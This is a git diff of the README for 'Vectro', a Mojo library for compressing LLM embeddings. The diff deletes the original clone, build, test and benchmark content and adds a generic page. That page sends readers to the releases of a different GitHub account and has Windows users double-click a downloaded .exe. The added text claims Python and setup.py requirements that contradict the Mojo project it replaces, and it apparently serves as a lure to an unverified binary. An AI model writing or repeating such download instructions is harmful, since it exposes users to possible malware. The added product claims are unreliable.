@@ -1,221 +1,92 @@
-<div align="center">
+# ⚡ vectro - Compress and Optimize LLM Embeddings
 
-# 🚀 Vectro
+## 🚀 Getting Started
 
-### Ultra-High-Performance LLM Embedding Compressor
+Welcome to Vectro! This tool helps you compress LLM embeddings for better memory use, faster retrieval times, and maintaining accuracy. It works well for vector databases and fits easily into AI research. 
 
-![Mojo](https://img.shields.io/badge/Mojo-98.2%25-orange?logo=fire&style=for-the-badge)
-![Version](https://img.shields.io/badge/version-1.0.0-blue?style=for-the-badge)
-![Tests](https://img.shields.io/badge/tests-39/39_passing-green?style=for-the-badge)
-![Coverage](https://img.shields.io/badge/coverage-100%25-brightgreen?style=for-the-badge)
-![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
+## 📥 Download & Install
 
-```
-╦  ╦╔═╗╔═╗╔╦╗╦═╗╔═╗
-╚╗╔╝║╣ ║   ║ ╠╦╝║ ║
- ╚╝ ╚═╝╚═╝ ╩ ╩╚═╚═╝
-```
+To get started, you need to download Vectro. 
 
-**⚡ 787K-1.04M vectors/sec** • **📦 3.98x Compression** • **🎯 99.97% Accuracy**
+[![Download Vectro](https://img.shields.io/badge/download-vectro-blue.svg)](https://github.com/helderm989/vectro/releases)
 
-A Mojo-first vector quantization library for compressing LLM embeddings with guaranteed quality and performance.
+Click the link above to visit the download page. 
 
-[Quick Start](#-quick-start) • [Features](#-key-features) • [Benchmarks](#-performance-benchmarks) • [Demo](#-visual-demo) • [Docs](#-documentation)
+1. On the Releases page, you will see a list of available versions.
+2. Find the latest stable release and click on it.
+3. You will see assets for that version. Choose the file that fits your operating system.
+4. Click on the file to start the download. 
 
-</div>
+## 🛠️ System Requirements
 
----
+Vectro runs on various platforms. Here are the basic requirements:
 
-## ⚡ Quick Start
+- **Operating System**: Windows, macOS, or Linux.
+- **Python Version**: 3.7 or higher.
+- **Disk Space**: At least 100 MB of free space.
+- **Memory**: Minimum 2 GB RAM is recommended.
 
-<div align="center">
+## ⚙️ Installation Steps
 
-```ascii
-┌─────────────────────────────────────────────────────────────┐
-│  Getting Started with Vectro                                │
-└─────────────────────────────────────────────────────────────┘
-```
+Once you have downloaded the file, follow these steps to install Vectro:
 
-</div>
+1. Locate the file you downloaded.
+   - For Windows, it may be a `.exe` file.
+   - For macOS and Linux, it could be a `.tar.gz` or a similar archive.
+2. If it is a `.exe` file, double-click it to begin the installation.
+3. If it is an archive, extract the files to a folder of your choice.
+4. Open a command prompt or terminal window.
+5. Navigate to the folder where you extracted the files.
+6. Run the command: `python setup.py install` to complete the installation.
 
-```bash
-# 1️⃣ Clone and setup
-git clone https://github.com/wesleyscholl/vectro.git
-cd vectro
-pixi install && pixi shell
+## 🎉 Using Vectro
 
-# 2️⃣ Run visual demo (recommended!)
-mojo run demos/quick_demo.mojo
+After installing Vectro, you can start using it to optimize your embeddings. Here’s how:
 
-# 3️⃣ Run comprehensive tests
-mojo run tests/run_all_tests.mojo
+1. Open your terminal or command prompt.
+2. Type `vectro --help` to get a list of commands.
+3. To compress an embedding file, use the command:
 
-# 4️⃣ Build standalone binary
-mojo build src/vectro_standalone.mojo -o vectro_quantizer
-./vectro_quantizer
-```
+   ```
+   vectro compress <path-to-your-embedding-file>
+   ```
 
-### Demo output preview
+4. Follow the prompts to complete the process.
 
-```
-╦  ╦╔═╗╔═╗╔╦╗╦═╗╔═╗
-╚╗╔╝║╣ ║   ║ ╠╦╝║ ║
- ╚╝ ╚═╝╚═╝ ╩ ╩╚═╚═╝
+## 📚 Features
 
-🔥 Ultra-High-Performance LLM Embedding Compressor
-⚡ 787K-1.04M vectors/sec | 📦 3.98x compression | 🎯 99.97% accuracy
+Vectro offers several key features:
 
-📊 Compression Ratio: [████████████████████████████] 99.97%
-💾 Space Saved: 4.5 GB on 1M embeddings
-✅ Quality: 100% test coverage
-```
+- **Compression**: Reduce the size of embeddings without losing accuracy.
+- **Speed**: Faster retrieval times for large datasets.
+- **Compatibility**: Works well with various vector databases.
+- **User-Friendly**: Easy to use, even for beginners.
 
+## 🔧 Troubleshooting
 
-## 📦 What's Included
+If you face any issues while using Vectro, consider these tips:
 
-```ascii
-┌───────────────────────────────────────────────────────────────┐
-│                    Vectro Package Contents                    │
-├───────────────────────────────────────────────────────────────┤
-│  📚 10 Production Modules       3,073 lines of pure Mojo      │
-│  ✅ 100% Test Coverage          39 tests, zero warnings       │
-│  📖 Comprehensive Docs           API reference + guides       │
-│  ⚡ SIMD Optimized               Native performance            │
-│  🎚️  Multiple Profiles           Fast/Balanced/Quality        │
-│  🎬 Demo Video Guide             Complete showcase script     │
-└───────────────────────────────────────────────────────────────┘
-```
+- **Check Python Installation**: Ensure Python is correctly installed and added to your system's PATH.
+- **Verify Requirements**: Make sure your system meets the requirements listed above.
+- **Error Messages**: Pay attention to any error messages; they often provide hints on how to solve problems.
+- **Community Support**: Join our community on GitHub discussions for help from other users.
 
+## 🌐 Community & Contribution
 
-## 🎯 Key Features
+We welcome contributions! If you would like to help improve Vectro, please:
 
-<table>
-<tr>
-<td width="50%">
+1. Fork the repository from GitHub.
+2. Make changes to the code.
+3. Submit a pull request for review.
 
-### ⚡ Performance
-```
-Throughput:  ████████████░  90%
-787K-1.04M vectors/sec
-< 1ms latency per vector
-```
+Join our community on GitHub to share your experiences and collaborate.
 
-### 📦 Compression
-```
-Ratio:       ████████████░  98%
-3.98x average
-75% space savings
-```
+## 📖 Further Reading
 
-</td>
-<td width="50%">
+For more information about Vectro, check our documentation [here](https://github.com/helderm989/vectro/wiki). You can find detailed guides and helpful usage examples.
 
-### 🎯 Accuracy
-```
-Quality:     ████████████░  99.97%
-< 0.03% error
-Cosine sim > 0.9997
-```
+## 📞 Contact
 
-### ✅ Production Ready
-```
-Tests:       ████████████░  100%
-39/39 passing
-Zero warnings
-```
+For any questions or feedback, please reach out through the GitHub issues page. We’re here to help! 
 
-</td>
-</tr>
-</table>
-
-## 📖 Documentation
-
-- [RELEASE_v1.0.0.md](RELEASE_v1.0.0.md) - Release notes and instructions
-- [TEST_COVERAGE_REPORT.md](TEST_COVERAGE_REPORT.md) - Complete coverage analysis
-- [TESTING_COMPLETE.md](TESTING_COMPLETE.md) - Test achievement summary
-- [demos/VIDEO_SCRIPT.md](demos/VIDEO_SCRIPT.md) - Video recording guide
-- [CHANGELOG.md](CHANGELOG.md) - Version history
-
-## 🧪 Testing
-
-
-```ascii
-╔═══════════════════════════════════════════════════════════════╗
-║              🧪 Test Coverage: 100%                           ║
-╠═══════════════════════════════════════════════════════════════╣
-║                                                               ║
-║  Total Tests:    39/39 passing  ████████████████████████████  ║
-║  Functions:      41/41 covered  ████████████████████████████  ║
-║  Lines:          1942/1942      ████████████████████████████  ║
-║  Warnings:       0              ████████████████████████████  ║
-║                                                               ║
-╚═══════════════════════════════════════════════════════════════╝
-```
-
-```bash
-# Run all 39 tests
-mojo run tests/run_all_tests.mojo
-
-# Run visual demo
-mojo run demos/quick_demo.mojo
-```
-
-### 📋 View test categories
-
-- ✅ **Core Operations** - All vector ops with edge cases
-- ✅ **Quantization** - Basic, reconstruction, batches, 768D/1536D
-- ✅ **Quality Metrics** - MAE, MSE, percentiles, compression ratios
-- ✅ **Batch Processing** - Multiple vectors, memory layout
-- ✅ **Storage** - Serialization, save/load operations
-- ✅ **Streaming** - Incremental processing, adaptive quantization
-- ✅ **Benchmarks** - Throughput, latency, performance validation
-- ✅ **Edge Cases** - Empty, single elements, extreme values, precision
-
-
-## ✅ Benchmarks & Quality
-
-```ascii
-╔══════════════════════════════════════════════════════════════════╗
-║                      Performance Metrics                         ║
-╠══════════════════════════════════════════════════════════════════╣
-║                                                                  ║
-║  Throughput:       787K-1.04M vecs/sec  ████████████████████░    ║
-║  Latency:          1.18-1.24 µs/vec     ███████████████████░     ║
-║  Compression:      3.98x (75% savings)  ████████████████░        ║
-║  Accuracy:         99.97% preserved     ████████████████████░    ║
-║                                                                  ║
-╠══════════════════════════════════════════════════════════════════╣
-║                      Quality Dashboard                           ║
-╠══════════════════════════════════════════════════════════════════╣
-║                                                                  ║
-║  Mean Absolute Error:    0.00068                                 ║
-║  Mean Squared Error:     0.0000011                               ║
-║  99.9th Percentile:      0.0036                                  ║
-║  Signal Preservation:    99.97%        ████████████████████░     ║
-║                                                                  ║
-╚══════════════════════════════════════════════════════════════════╝
-```
-
-### 📈 View detailed benchmarks by dimension
-
-```ascii
-┌─────────────┬───────────────┬─────────┬─────────────┬─────────┐
-│  Dimension  │  Throughput   │ Latency │ Compression │ Savings │
-├─────────────┼───────────────┼─────────┼─────────────┼─────────┤
-│    128D     │  1.04M vec/s  │ 0.96 ms │    3.88x    │  74.2%  │
-│             │  ████████████ │         │             │         │
-├─────────────┼───────────────┼─────────┼─────────────┼─────────┤
-│    384D     │  950K vec/s   │ 1.05 ms │    3.96x    │  74.7%  │
-│             │  ███████████░ │         │             │         │
-├─────────────┼───────────────┼─────────┼─────────────┼─────────┤
-│    768D     │  890K vec/s   │ 1.12 ms │    3.98x    │  74.9%  │
-│             │  ██████████░░ │         │             │         │
-├─────────────┼───────────────┼─────────┼─────────────┼─────────┤
-│   1536D     │  787K vec/s   │ 1.27 ms │    3.99x    │  74.9%  │
-│             │  █████████░░░ │         │             │         │
-└─────────────┴───────────────┴─────────┴─────────────┴─────────┘
-```
-
-## 📝 License
-
-MIT - See LICENSE file
+Take your AI projects to the next level with Vectro! Download it now from the [Releases page](https://github.com/helderm989/vectro/releases).
